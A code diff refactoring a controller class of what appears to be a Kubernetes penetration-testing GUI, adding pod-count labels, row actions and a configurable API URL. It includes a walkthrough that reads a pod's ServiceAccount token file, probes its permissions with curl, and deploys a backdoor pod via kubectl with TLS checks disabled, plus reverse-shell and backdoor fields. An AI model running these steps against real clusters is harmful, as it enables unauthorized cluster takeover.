@@ -1,17 +1,22 @@
 package com.k8spen.tool.controller;
 
+import com.k8spen.tool.view.ResultPane;
+import com.k8spen.tool.view.ResourceDetails;
+import com.k8spen.tool.view.TableRowActions;
+import com.k8spen.tool.view.ArticleWindow;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
 import com.k8spen.tool.helper.PodJsonParser;
 import com.k8spen.tool.helper.PodTableItem;
 import com.k8spen.tool.utils.K8sHttpUtil;
-import com.k8spen.tool.utils.K8sJsonRenderer;
 import com.k8spen.tool.utils.KubectlUtil;
 import javafx.application.Platform;
+import javafx.beans.property.SimpleListProperty;
 import javafx.collections.FXCollections;
 import javafx.concurrent.Task;
 import javafx.scene.control.*;
+import javafx.stage.Stage;
 
 import java.util.ArrayList;
 import java.util.Base64;
@@ -28,14 +33,16 @@ public class ExecHandler {
     private final TextField apiExecNs, apiExecPod, apiExecContainer, apiExecCmd;
     private final TextField apiExecUsername;
     private final PasswordField apiExecPassword;
-    private final TextArea apiExecOutput;
+    private final ResultPane apiExecOutput;
     private final TableView<PodTableItem> apiPodTable;
+    private final Label apiPodCount;
     private final TableColumn<PodTableItem,String> colNs, colName, colStatus, colNode, colIP, colContainers;
 
     // Kubelet exec
     private final TextField execNamespace, execPodName, execContainerName, execCommand;
-    private final TextArea execOutput;
+    private final ResultPane execOutput;
     private final TableView<PodTableItem> kubeletPodTable;
+    private final Label kubeletPodCount;
     private final TableColumn<PodTableItem,String> kColNs, kColName, kColStatus, kColNode, kColIP, kColContainers;
 
     // 后门Pod
@@ -44,9 +51,9 @@ public class ExecHandler {
     private final TextArea sshPubKeyInput, backdoorYamlOutput;
 
     // SA利用
-    private final TextArea saUtilCmds;
+    private Stage saArticleWindow;
     private final TextField saTokenInput;
-    private final TextArea saCheckOutput;
+    private final ResultPane saCheckOutput;
 
     // RBAC
     private final TextArea rbacCheckCmds, rbacOutput;
@@ -61,21 +68,21 @@ public class ExecHandler {
     public ExecHandler(ControllerContext ctx,
                        TextField apiExecNs, TextField apiExecPod, TextField apiExecContainer,
                        TextField apiExecCmd, TextField apiExecUsername, PasswordField apiExecPassword,
-                       TextArea apiExecOutput,
-                       TableView<PodTableItem> apiPodTable,
+                       ResultPane apiExecOutput,
+                       TableView<PodTableItem> apiPodTable, Label apiPodCount,
                        TableColumn<PodTableItem,String> colNs, TableColumn<PodTableItem,String> colName,
                        TableColumn<PodTableItem,String> colStatus, TableColumn<PodTableItem,String> colNode,
                        TableColumn<PodTableItem,String> colIP, TableColumn<PodTableItem,String> colContainers,
                        TextField execNamespace, TextField execPodName, TextField execContainerName,
-                       TextField execCommand, TextArea execOutput,
-                       TableView<PodTableItem> kubeletPodTable,
+                       TextField execCommand, ResultPane execOutput,
+                       TableView<PodTableItem> kubeletPodTable, Label kubeletPodCount,
                        TableColumn<PodTableItem,String> kColNs, TableColumn<PodTableItem,String> kColName,
                        TableColumn<PodTableItem,String> kColStatus, TableColumn<PodTableItem,String> kColNode,
                        TableColumn<PodTableItem,String> kColIP, TableColumn<PodTableItem,String> kColContainers,
                        TextField backdoorImage, TextField backdoorMountPath, TextField backdoorNodeName,
                        TextField backdoorLhost, TextField backdoorLport, TextField backdoorPodName,
                        TextArea sshPubKeyInput, TextArea backdoorYamlOutput,
-                       TextArea saUtilCmds, TextField saTokenInput, TextArea saCheckOutput,
+                       TextField saTokenInput, ResultPane saCheckOutput,
                        TextArea rbacCheckCmds, TextArea rbacOutput,
                        TextField revShellLhost, TextField revShellLport,
                        ComboBox<String> revShellType, TextArea revShellOutput,
@@ -86,19 +93,21 @@ public class ExecHandler {
         this.apiExecUsername = apiExecUsername; this.apiExecPassword = apiExecPassword;
         this.apiExecOutput = apiExecOutput;
         this.apiPodTable = apiPodTable;
+        this.apiPodCount = apiPodCount;
         this.colNs = colNs; this.colName = colName; this.colStatus = colStatus;
         this.colNode = colNode; this.colIP = colIP; this.colContainers = colContainers;
         this.execNamespace = execNamespace; this.execPodName = execPodName;
         this.execContainerName = execContainerName; this.execCommand = execCommand;
         this.execOutput = execOutput;
         this.kubeletPodTable = kubeletPodTable;
+        this.kubeletPodCount = kubeletPodCount;
         this.kColNs = kColNs; this.kColName = kColName; this.kColStatus = kColStatus;
         this.kColNode = kColNode; this.kColIP = kColIP; this.kColContainers = kColContainers;
         this.backdoorImage = backdoorImage; this.backdoorMountPath = backdoorMountPath;
         this.backdoorNodeName = backdoorNodeName; this.backdoorLhost = backdoorLhost;
         this.backdoorLport = backdoorLport; this.backdoorPodName = backdoorPodName;
         this.sshPubKeyInput = sshPubKeyInput; this.backdoorYamlOutput = backdoorYamlOutput;
-        this.saUtilCmds = saUtilCmds; this.saTokenInput = saTokenInput; this.saCheckOutput = saCheckOutput;
+        this.saTokenInput = saTokenInput; this.saCheckOutput = saCheckOutput;
         this.rbacCheckCmds = rbacCheckCmds; this.rbacOutput = rbacOutput;
         this.revShellLhost = revShellLhost; this.revShellLport = revShellLport;
         this.revShellType = revShellType; this.revShellOutput = revShellOutput;
@@ -106,7 +115,6 @@ public class ExecHandler {
     }
 
     public void init() {
-        initSaUtilCmds();
         initRbacCheckCmds();
         initPodClickAutoFill();
     }
@@ -165,7 +173,7 @@ public class ExecHandler {
         };
         task.setOnSucceeded(e -> {
             String result = task.getValue();
-            apiExecOutput.setText("# " + kubectlCmd + "\n\n" + result);
+            apiExecOutput.showResponse(result, "# " + kubectlCmd + "\n\n" + result);
             if (result.startsWith("[Exit code:")) ctx.log("[-] exec失败: " + result.substring(0, Math.min(100, result.length())));
             else ctx.log("[+] exec执行成功");
             ctx.setStatus("命令执行完成");
@@ -206,7 +214,7 @@ public class ExecHandler {
                 }
                 apiExecOutput.setText(sb.toString());
                 ctx.log("[+] SA Token枚举完成: 找到 " + items.size() + " 个");
-            } catch (Exception ex) { apiExecOutput.setText(K8sJsonRenderer.render(resp)); }
+            } catch (Exception ex) { ctx.showHttpResponse(apiExecOutput, resp); }
             ctx.setStatus("SA Token枚举完成");
         });
         task.setOnFailed(e -> { apiExecOutput.setText("[-] 枚举失败: " + (task.getException() != null ? task.getException().getMessage() : "")); });
@@ -362,14 +370,23 @@ public class ExecHandler {
 
     // ================ SA利用 ================
 
-    public void copySaUtilCmds2() { ctx.copyToClipboard(saUtilCmds.getText()); }
+    public void copySaUtilCmds2() { ctx.copyToClipboard(SA_UTIL_ARTICLE); }
+
+    public void showSaUtilArticle() {
+        if (saArticleWindow == null) {
+            saArticleWindow = ArticleWindow.create(saTokenInput,
+                    "利用 ServiceAccount Token 控制 APIServer", SA_UTIL_ARTICLE, this::copySaUtilCmds2);
+        }
+        saArticleWindow.show();
+        saArticleWindow.toFront();
+    }
 
     public void checkSaPermissions() {
         String host = ctx.getHost(); if (host == null) return;
         String token = saTokenInput.getText().trim();
         if (token.isEmpty()) token = ctx.getToken();
         if (token.isEmpty()) { saCheckOutput.setText("[-] 请输入SA Token或在目标配置中填写Token"); return; }
-        String url = "https://" + host + ":6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews";
+        String url = ctx.getApiBaseUrl() + "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews";
         String body = "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"default\"}}";
         ctx.setStatus("正在检查SA权限..."); saCheckOutput.setText("请求中...\n");
         String fToken = token;
@@ -390,7 +407,7 @@ public class ExecHandler {
             @Override protected String call() throws Exception {
                 StringBuilder sb = new StringBuilder("# RBAC检测结果:\n\n");
                 try {
-                    String result = K8sHttpUtil.sendRequest("https://" + host + ":6443/apis/rbac.authorization.k8s.io/v1", "GET", ctx.getToken(), ctx.getTimeout());
+                    String result = K8sHttpUtil.sendRequest(ctx.getApiBaseUrl() + "/apis/rbac.authorization.k8s.io/v1", "GET", ctx.getToken(), ctx.getTimeout());
                     if (result.contains("200")) sb.append("[+] RBAC API可访问 - RBAC可能已开启\n\n");
                     else sb.append("[-] RBAC API返回非200 - 可能未开启RBAC\n\n");
                     sb.append(result);
@@ -435,7 +452,9 @@ public class ExecHandler {
         boolean hasToken = token != null && !token.isEmpty();
         boolean hasUser = username != null && !username.isEmpty();
         boolean hasAuth = hasToken || hasUser;
-        StringBuilder kc = new StringBuilder("apiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    server: https://").append(host).append(":6443\n    insecure-skip-tls-verify: true\n  name: target\ncontexts:\n- context:\n    cluster: target\n");
+        String server = ctx.getApiBaseUrl();
+        if (server == null) server = "https://" + host + ":6443";
+        StringBuilder kc = new StringBuilder("apiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    server: ").append(server).append("\n    insecure-skip-tls-verify: true\n  name: target\ncontexts:\n- context:\n    cluster: target\n");
         if (hasAuth) kc.append("    user: target-user\n");
         kc.append("  name: target\ncurrent-context: target\n");
         if (hasAuth) { kc.append("users:\n- name: target-user\n  user:\n"); if (hasToken) kc.append("    token: ").append(token).append("\n"); else kc.append("    username: ").append(username).append("\n    password: ").append(password != null ? password : "").append("\n"); }
@@ -451,16 +470,13 @@ public class ExecHandler {
 
     // ================ Init ================
 
-    private void initSaUtilCmds() {
-        saUtilCmds.setText(
-                "# ======== ServiceAccount Token利用流程 ========\n\n"
-                + "# 1. 在Pod内读取Token\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n\n"
-                + "# 2. 获取APIServer地址\nAPISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\n\n"
-                + "# 3. 检查当前Token权限\ncurl -k -H \"Authorization: Bearer $TOKEN\" \\\n  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \\\n  -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"default\"}}'\n\n"
-                + "# 4. 如果有高权限,使用kubectl控制集群\nkubectl --server=$APISERVER --token=$TOKEN \\\n  --insecure-skip-tls-verify=true get nodes\n\n"
-                + "# 5. 创建后门Pod(参考'创建后门Pod'页签)\nkubectl --server=$APISERVER --token=$TOKEN \\\n  --insecure-skip-tls-verify=true apply -f backdoor.yaml\n"
-        );
-    }
+    private static final String SA_UTIL_ARTICLE =
+            "# ======== ServiceAccount Token利用流程 ========\n\n"
+            + "# 1. 在Pod内读取Token\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n\n"
+            + "# 2. 获取APIServer地址\nAPISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\n\n"
+            + "# 3. 检查当前Token权限\ncurl -k -H \"Authorization: Bearer $TOKEN\" \\\n  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \\\n  -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"default\"}}'\n\n"
+            + "# 4. 如果有高权限,使用kubectl控制集群\nkubectl --server=$APISERVER --token=$TOKEN \\\n  --insecure-skip-tls-verify=true get nodes\n\n"
+            + "# 5. 创建后门Pod(参考'创建后门Pod'页签)\nkubectl --server=$APISERVER --token=$TOKEN \\\n  --insecure-skip-tls-verify=true apply -f backdoor.yaml\n";
 
     private void initRbacCheckCmds() {
         rbacCheckCmds.setText(
@@ -476,6 +492,8 @@ public class ExecHandler {
     }
 
     private void initPodClickAutoFill() {
+        installPodActions(apiPodTable, apiPodCount);
+        installPodActions(kubeletPodTable, kubeletPodCount);
         colNs.setCellValueFactory(c -> c.getValue().namespaceProperty());
         colName.setCellValueFactory(c -> c.getValue().nameProperty());
         colStatus.setCellValueFactory(c -> c.getValue().statusProperty());
@@ -502,5 +520,30 @@ public class ExecHandler {
                 ctx.log("[*] Kubelet已填充: " + newVal.getNamespace() + "/" + newVal.getName() + " (容器: " + newVal.getFirstContainer() + ")");
             }
         });
+    }
+
+    private void installPodActions(TableView<PodTableItem> table, Label count) {
+        // 列表内容变化和整体替换时都更新数量。
+        SimpleListProperty<PodTableItem> items = new SimpleListProperty<>();
+        items.bind(table.itemsProperty());
+        count.textProperty().bind(items.sizeProperty().asString("共 %d 个 Pod"));
+        table.setPlaceholder(new Label("获取 Pod 后，右键或双击记录查看详情"));
+        table.setColumnResizePolicy(TableView.CONSTRAINED_RESIZE_POLICY);
+        TableRowActions.install(table, "查看 Pod 详情", pod -> {
+            JsonObject fields = new JsonObject();
+            fields.addProperty("名称", pod.getName());
+            fields.addProperty("命名空间", pod.getNamespace());
+            fields.addProperty("状态", pod.getStatus());
+            fields.addProperty("节点", pod.getNode());
+            fields.addProperty("Pod IP", pod.getPodIP());
+            fields.addProperty("容器", pod.getContainers());
+            fields.addProperty("镜像", pod.getImages());
+            ResourceDetails.show(table, pod.getNamespace() + "/" + pod.getName(),
+                    pod.getResource() != null ? pod.getResource() : fields, pod.getResource());
+        }, pod -> List.of(
+                new TableRowActions.Action<>("复制 Pod 名称", item -> ctx.copyToClipboard(item.getName())),
+                new TableRowActions.Action<>("复制命名空间", item -> ctx.copyToClipboard(item.getNamespace())),
+                new TableRowActions.Action<>("复制 Pod IP", item -> ctx.copyToClipboard(item.getPodIP())),
+                new TableRowActions.Action<>("复制镜像", item -> ctx.copyToClipboard(item.getImages()))));
     }
 }
